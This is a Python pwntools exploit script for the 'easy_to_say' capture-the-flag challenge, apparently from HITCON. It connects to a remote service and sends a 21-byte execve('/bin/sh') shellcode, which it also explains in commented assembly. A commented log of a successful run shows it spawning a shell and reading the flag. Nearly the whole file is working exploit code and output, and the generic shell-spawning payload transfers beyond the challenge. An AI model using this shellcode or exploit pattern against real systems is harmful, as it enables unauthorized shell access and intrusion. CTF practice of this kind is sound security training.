#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=False, terminal=['tmux', 'neww'])
env = {}

if args['GDB']:
    io = gdb.debug(
        './easy_to_say',
        env=env,
        gdbscript='''\
        set follow-fork-mode parent
        c
    ''')
    elf, libc = io.elf, io.libc
elif args['REMOTE']:
    io = remote('52.69.40.204', 8361)
    elf, libc = ELF('./easy_to_say'), None
else:
    io = process('./easy_to_say', env=env)
    elf, libc = io.elf, io.libc

io.recvuntil('Give me your code :')

# bits 64
# section .text
#     global _start

# _start:
#     mov qword rbx, 'Nbin/sh'
#     xor bl, 'a'
#     push rbx

#     push rsp
#     pop rdi

#     push 0x3b
#     pop rax
#     syscall
io.send('\x48\xbb\x4e\x62\x69\x6e\x2f\x73\x68\x00\x80\xf3\x61\x53\x54\x5f\x6a\x3b\x58\x0f\x05')

io.interactive()

# $ ./easy_to_say.py REMOTE
# [+] Opening connection to 52.69.40.204 on port 8361: Done
# [*] '/home/ubuntu/vbox/easy_to_say'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     FORTIFY:  Enabled
# [*] Switching to interactive mode
# Run !
# $ cat /home/easy_to_say/flag
# hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
